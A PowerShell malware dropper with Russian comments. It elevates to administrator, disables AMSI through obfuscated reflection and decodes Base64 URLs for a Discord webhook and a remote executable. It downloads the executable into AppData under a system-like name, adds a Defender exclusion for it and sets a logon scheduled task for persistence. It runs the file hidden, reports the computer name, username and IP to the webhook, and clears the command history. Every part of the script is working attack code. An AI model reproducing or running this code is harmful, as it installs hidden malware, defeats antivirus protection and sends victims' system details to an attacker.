# Установка TLS 1.2 (обязательно для работы с Discord/API)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$s = [Security.Principal.WindowsBuiltInRole]::Administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole($s)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Маскировка имен
$a = "System.Management.Automation.A" + "msi" + "Utils"
$f = "am" + "si" + "Init" + "Failed"

try {
    $m = [Ref].Assembly.GetType($a)
    if ($m) {
        $m.GetField($f, 'NonPublic,Static').SetValue($null, $true)
    }
} catch {}

# Данные (Base64) - твои ссылки
$w_b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMDIwMDIwNTU0MTMxMDQ2NC85UGZudUlKX1VULTd2M2xvZXQ3RjMyWFZHUS01U0dtdUhMa1lFVEUtcjl0MG9sZFRMd3d2TXg1WXNQX0oyZVRuWFhtaw=="
$e_b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dpbnN0YXJjaGlrL0ZGRi9tYWluL1hDbGllbnQuZXhl"

$url_w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($w_b64))
$url_e = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e_b64))
$path = "$env:APPDATA\win_sys_helper.exe"

function Send-Report($msg) {
    try {
        # Получаем IP с обработкой ошибок
        $ip = "Unknown"
        try { $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch {}
        
        $body = @{ content = "LOG: $msg | PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" } | ConvertTo-Json
        # Отправка на вебхук
        [Net.HttpWebRequest]::Create($url_w).Method = "POST"
        Invoke-RestMethod -Uri $url_w -Method Post -Body $body -ContentType "application/json"
    } catch {}
}

try {
    # Скачивание
    $wc = New-Object Net.WebClient
    $wc.DownloadFile($url_e, $path)
    
    # Исключение
    $exc = "Add-MpPre" + "ference -Exclusio" + "nPath '$path'"
    powershell -WindowStyle Hidden -Command "$exc"

    # Закрепление
    $task = "WinNetHelper"
    $act = New-ScheduledTaskAction -Execute $path
    $trg = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action $act -Trigger $trg -TaskName $task -RunLevel Highest -Force | Out-Null

    # Запуск
    if (Test-Path $path) {
        Start-Process -FilePath $path -WindowStyle Hidden
        Send-Report "Success: Process started and Persistence set."
    } else {
        Send-Report "Error: File not found after download."
    }
} catch {
    Send-Report "Fatal Error: $($_.Exception.Message)"
}

Clear-History
